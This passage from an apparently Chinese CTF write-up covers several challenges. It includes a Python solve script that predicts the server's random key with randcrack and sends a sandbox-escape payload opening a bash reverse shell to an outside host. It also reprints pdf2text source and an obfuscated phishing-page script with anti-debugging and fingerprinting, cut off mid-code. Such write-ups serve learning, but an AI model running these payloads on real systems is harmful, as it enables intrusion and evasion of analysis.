/flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里，一直以为是<code>payload</code>的<strong>命令执行</strong>有问题，可能是后台开太多了，我起<code>docker</code>的时候都<strong>没反应</strong>，后面全部关掉，重启电脑，起<code>docker</code>，在<strong>服务端</strong>发现了问题所在</p><p>这里的<strong>回显</strong>并不在客户端，而是在<strong>服务端</strong>，所以我们是看不见输出的<br><img src="https://picx.zhimg.com/80/v2-bd7b49c18653851a32bf1502c1298d64_1440w.png" alt=""><br>原来是没有常见的<code>/var/www/html</code>目录</p><p>然后<strong>写文件</strong>又报错，一看原来是<strong>没权限</strong>，应该是<code>app</code>用户权限太低了，只能读，最后只能通过<strong>反弹shell</strong>拿到<code>flag</code>了，服务器又到期了，只能去白嫖<code>cat.flag.sh</code></p><p>后面看<code>Vidar-Team</code>到的<code>wp</code>，是可以写到<code>/app/static</code>目录下的，是哦把这个静态目录忘了，访问<code>url/static/1.txt</code>即可，好技巧</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://49.232.42.74:30158/api&quot;</span></span><br><span class="line">rc = RandCrack()</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">624</span>, desc=<span class="string">&quot;Collecting numbers&quot;</span>):</span><br><span class="line">    res = session.post(url, json=&#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;0&#x27;</span>&#125;)</span><br><span class="line">    message = res.json().get(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    leaked_key = re.search(<span class="string">r&#x27;\d+&#x27;</span>, message)</span><br><span class="line">    num = <span class="built_in">int</span>(leaked_key.group(<span class="number">0</span>))</span><br><span class="line">    rc.submit(num)</span><br><span class="line"></span><br><span class="line">predicted_key = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;[i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &#x27;_wrap_close&#x27;][0].__init__.__globals__[&#x27;system&#x27;](&quot;/bin/bash -c &#x27;exec&lt;&gt;/dev/tcp/cat.flag.sh/3001;echo&gt;&amp;0 CoCa1Vej;$0 -i&lt;&amp;0&gt;&amp;0 2&gt;&amp;0&#x27;&quot;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = session.post(</span><br><span class="line">    urlL, json=&#123;<span class="string">&#x27;key&#x27;</span>: <span class="built_in">str</span>(predicted_key), <span class="string">&#x27;payload&#x27;</span>: payload&#125;)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload 注入成功!<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="pdf2text-24-solved"><a href="#pdf2text-24-solved" class="headerlink" title="pdf2text* | 24 solved"></a>pdf2text* | 24 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">import</span> os, io</span><br><span class="line"><span class="keyword">from</span> pdfutils <span class="keyword">import</span> pdf_to_text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 2MB limit</span></span><br><span class="line"></span><br><span class="line">os.makedirs(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file part&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    filename = file.filename</span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;directory traversal is not allowed&#x27;</span>, <span class="number">403</span> </span><br><span class="line"></span><br><span class="line">    pdf_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    pdf_content = file.stream.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># just if is a pdf</span></span><br><span class="line">        parser = PDFParser(io.BytesIO(pdf_content))</span><br><span class="line">        doc = PDFDocument(parser)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pdf_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_content)</span><br><span class="line"></span><br><span class="line">    md_filename = os.path.splitext(filename)[<span class="number">0</span>] + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    txt_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pdf_to_text(pdf_path, txt_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> send_file(txt_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_pages</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextContainer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_text</span>(<span class="params">pdf_path, txt_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> page_layout <span class="keyword">in</span> extract_pages(pdf_path):</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> page_layout:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(element, LTTextContainer):</span><br><span class="line">                    txt.write(element.get_text())</span><br><span class="line">                    txt.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>没找到啥参考文章，找<code>ai</code>要了些攻击用例，但都被<strong>过滤</strong>了，要么不起作用</p><p>诶诶诶，原来还是代码审计吗？需要跟进<code>pdfminer包</code>去分析，具体过程看<code>N1</code>和<code>SU</code>战队的<code>wp</code>吧</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="catfriend-172-solved"><a href="#catfriend-172-solved" class="headerlink" title="catfriend | 172 solved"></a>catfriend | 172 solved</h2><p>记事本打开即送(爽赤)</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="phishing-email-38-solved"><a href="#phishing-email-38-solved" class="headerlink" title="phishing email | 38 solved"></a>phishing email | 38 solved</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="title class_">Hidden</span> malicious script <span class="keyword">with</span> multiple layers <span class="keyword">of</span> obfuscation --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">&lt;![<span class="variable constant_">CDATA</span>[</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Anti-debugging and detection evasion</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> jXKuzdDMGk = <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> detectionBypass = <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> globalSeed = <span class="number">0x5A4D</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> entropy = [];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Advanced fingerprinting and detection evasion</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  (<span class="keyword">function</span> <span class="title function_">antiDetection</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Check for WebDriver, PhantomJS, Burp Suite</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (navigator.<span class="property">webdriver</span> || <span class="variable language_">window</span>.<span class="property">callPhantom</span> || <span class="variable language_">window</span>.<span class="property">_phantom</span> || </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;Burp&quot;</span>) || navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;HeadlessChrome&quot;</span>) ||</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        navigator.<span class="property">userAgent</span>.<span class="title function_">includes</span>(<span class="string">&quot;Selenium&quot;</span>) || <span class="variable language_">window</span>.<span class="property">chrome</span> &amp;&amp; chrome.<span class="property">runtime</span> &amp;&amp; chrome.<span class="property">runtime</span>.<span class="property">onConnect</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;about:blank&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Advanced environment fingerprinting</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ctx.<span class="property">textBaseline</span> = <span class="string">&#x27;top&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ctx.<span class="property">font</span> = <span class="string">&#x27;14px Arial&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ctx.<span class="title function_">fillText</span>(<span class="string">&#x27;Browser fingerprint test&#x27;</span>, <span class="number">2</span>, <span class="number">2</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> fingerprint = canvas.<span class="title function_">toDataURL</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Generate entropy from browser characteristics</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    entropy = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      navigator.<span class="property">hardwareConcurrency</span> || <span class="number">4</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      screen.<span class="property">colorDepth</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      screen.<span class="property">pixelDepth</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTimezoneOffset</span>(),</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      fingerprint.<span class="property">length</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      navigator.<span class="property">language</span>.<span class="property">length</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">window</span>.<span class="property">devicePixelRatio</span> * <span class="number">1000</span> | <span class="number">0</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Check for debugging environment indicators</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span> || </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">200</span> ||</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        fingerprint.<span class="property">length</span> &lt; <span class="number">100</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      detectionBypass = <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// Generate seed from entropy</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    globalSeed = entropy.<span class="title function_">reduce</span>(<span class="keyword">function</span>(<span class="params">acc, val</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> ((acc &lt;&lt; <span class="number">5</span>) - acc + val) &amp; <span class="number">0xFFFFFFFF</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;, <span class="number">0x5A4D</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Block developer tools shortcuts</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> blockedKeys = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">keyCode</span>: <span class="number">123</span> &#125;, <span class="comment">// F12</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">85</span> &#125;, <span class="comment">// Ctrl + U</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">73</span> &#125;, <span class="comment">// Ctrl + Shift + I</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">67</span> &#125;, <span class="comment">// Ctrl + Shift + C</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">74</span> &#125;, <span class="comment">// Ctrl + Shift + J</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">ctrl</span>: <span class="literal">true</span>, <span class="attr">shift</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">75</span> &#125;, <span class="comment">// Ctrl + Shift + K</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">meta</span>: <span class="literal">true</span>, <span class="attr">alt</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">73</span> &#125;, <span class="comment">// Cmd + Alt + I (Mac)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#123; <span class="attr">meta</span>: <span class="literal">true</span>, <span class="attr">keyCode</span>: <span class="number">85</span> &#125; <span class="comment">// Cmd + U (Mac)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> isBlocked = blockedKeys.<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> (!key.<span class="property">ctrl</span> || event.<span class="property">ctrlKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             (!key.<span class="property">shift</span> || event.<span class="property">shiftKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             (!key.<span class="property">meta</span> || event.<span class="property">metaKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             (!key.<span class="property">alt</span> || event.<span class="property">altKey</span>) &amp;&amp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">             event.<span class="property">keyCode</span> === key.<span class="property">keyCode</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (isBlocked) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      event.<span class="title function_">preventDefault</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Block right-click context menu</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;contextmenu&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    event.<span class="title function_">preventDefault</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Advanced anti-debugging using performance timing with variable thresholds</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  (<span class="keyword">function</span> <span class="title function_">timingCheck</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> baseThreshold = <span class="number">50</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> dynamicThreshold = baseThreshold + (globalSeed % <span class="number">100</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> checkCount = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> start = performance.<span class="title function_">now</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">debugger</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> end = performance.<span class="title function_">now</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      checkCount++;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">// Variable threshold based on environment</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> currentThreshold = dynamicThreshold + (checkCount * <span class="number">10</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">if</span> (end - start &gt; currentThreshold &amp;&amp; detectionBypass) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        jXKuzdDMGk = <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// Redirect with multiple decoy destinations</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> decoyUrls = [<span class="string">&#x27;https://www.google.com&#x27;</span>, <span class="string">&#x27;https://www.microsoft.com&#x27;</span>, <span class="string">&#x27;about:blank&#x27;</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(decoyUrls[globalSeed % decoyUrls.<span class="property">length</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;, <span class="number">150</span> + (globalSeed % <span class="number">100</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">customPRNG</span>(<span class="params">seed</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> m = <span class="number">0x80000000</span>; <span class="comment">// 2**31</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> a = <span class="number">1103515245</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> c = <span class="number">12345</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    seed = (a * seed + c) % m;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> seed / (m - <span class="number">1</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">function</span> <span class="title function_">advancedXOR</span>(<span class="params">data, keyBase</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> result = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> expandedKey = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> keyChar = keyBase.<span class="title function_">charCodeAt</span>(i % keyBase.<span class="property">length</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> entropyVal = entropy[i % entropy.<span class="property">length</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> rotatedKey = ((keyChar ^ entropyVal) + globalSeed) % <span class="number">256</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      expandedKey += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(rotatedKey);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; data.<span class="property">length</span>; j++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      result += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(data.<span class="title function_">charCodeAt</span>(j) ^ expandedKey.<span class="title function_">charCodeAt</span>(j));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> result;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// Main payload - heavily obfuscated with multiple transformation layers</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (!jXKuzdDMGk &amp;&amp; detectionBypass) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decoyArray1 = [<span class="number">119</span>,<span class="number">109</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">125</span>]; <span class="comment">// wmctf&#123;fake_flag&#125;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> decoyArray2 = [<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> polymorphicData = [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;V01DVEZbZmFrZV9mbGFnXQ==&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;bm90X3RoZV9yZWFsX2ZsYWc=&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="string">&#x27;ZGVjb3lfZGF0YQ==&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span 